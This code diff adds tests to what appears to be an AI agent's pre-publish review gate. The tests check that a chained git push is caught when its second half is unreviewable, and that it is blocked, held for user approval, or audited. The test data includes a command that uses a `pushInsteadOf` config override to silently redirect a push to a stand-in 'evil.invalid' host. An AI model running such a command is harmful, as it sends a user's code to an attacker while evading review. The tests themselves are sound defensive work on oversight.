@@ -244,6 +244,64 @@ describe("FAILED / UNKNOWN — nothing ships unreviewed without the user's yes, 
   }
 });
 
+// `git push origin feature && git -c url.<evil>.pushInsteadOf=<good> push <good>
+// main`: the first push is reviewed, the second is refused by the dry run. A
+// verdict on the first must not carry the second out without the user's yes.
+describe("a publish that could not be reviewed rides along with one that was", () => {
+  const SECOND = "git push https://good.invalid/r main";
+  const COMMAND = `git push origin feature && git -c url.https://evil.invalid/.pushInsteadOf=https://good.invalid/ push https://good.invalid/r main`;
+  const REFUSED = "the command sets git config url.*.pushinsteadof (-c) for the push, which can change where it connects, what it sends or what it runs, and the review cannot apply it; not run before approval";
+  const partial = (next: PublishReviewRun): Fake => {
+    const f = fake(next);
+    f.set = changeSet(`fp-partial-${seq}`, { unknown: [{ label: SECOND, cwd: "/repo", reason: REFUSED }] });
+    return f;
+  };
+
+  for (const [what, run] of [["GREEN", GREEN], ["AMBER", AMBER]] as const) {
+    it(`${what} on the first under Autonomous: an always-ask 'Push unreviewed' card naming the second; no means NOT RUN`, async () => {
+      const f = partial(run);
+      const events: ServerEvent[] = [];
+      const c = ctx({ sessionId: session("Autonomous"), command: COMMAND, answer: false, events });
+      expect((await requireApprovalPhase(c)).kind).toBe("halt");
+      expect(f.reviews).toBe(1);
+      const [card] = cards(events);
+      expect(card.rememberable).toBe(false);
+      expect(card.context).toContain(`Part of what this call publishes was not reviewed: ${SECOND}`);
+      expect(card.context).toContain(`The rest: ${what}`);
+      expect(card.preview).toMatchObject({ status: what, overrideLabel: "Push unreviewed", unknown: [{ label: SECOND, reason: REFUSED }] });
+      expect(c.result?.status).toBe("declined");
+      expect(lastText(c)).toContain(`part of what it publishes could not be reviewed: ${SECOND}`);
+      expect(lastText(c)).toContain("Do not publish by another route");
+    });
+  }
+
+  it("yes runs it, and the audit says which part went out unreviewed", async () => {
+    partial(GREEN);
+    const s = session("Power");
+    const c = ctx({ sessionId: s, command: COMMAND, answer: true });
+    expect((await requireApprovalPhase(c)).kind).toBe("continue");
+    const audit = getSharedAuditTrail(laxDir).getRecent(5).find((e) => e.event === "publish_review_overridden" && e.sessionId === s);
+    expect(audit?.reason).toContain(`although part of it could not be reviewed (${SECOND}: ${REFUSED}; the rest was GREEN)`);
+  });
+
+  it("over a RED verdict on the first, the audit also records the unreviewed second", async () => {
+    partial(RED);
+    const s = session("Power");
+    expect((await requireApprovalPhase(ctx({ sessionId: s, command: COMMAND, answer: true }))).kind).toBe("continue");
+    const audit = getSharedAuditTrail(laxDir).getRecent(5).find((e) => e.event === "publish_review_overridden" && e.sessionId === s);
+    expect(audit?.reason).toContain(`over a RED pre-publish review, with part of it not reviewed (${SECOND}: ${REFUSED})`);
+  });
+
+  it("unattended + Autonomous: blocked, no card", async () => {
+    partial(GREEN);
+    const events: ServerEvent[] = [];
+    const c = ctx({ sessionId: session("Autonomous"), callContext: "cron", command: COMMAND, events });
+    expect((await requireApprovalPhase(c)).kind).toBe("halt");
+    expect(cards(events)).toEqual([]);
+    expect(lastText(c)).toContain("unattended run, so nobody can override it");
+  });
+});
+
 describe("RED — blocked unless the user overrides", () => {
   it("interactive: an always-ask 'Push anyway' card with the findings; yes runs it and is audited", async () => {
     fake(RED);
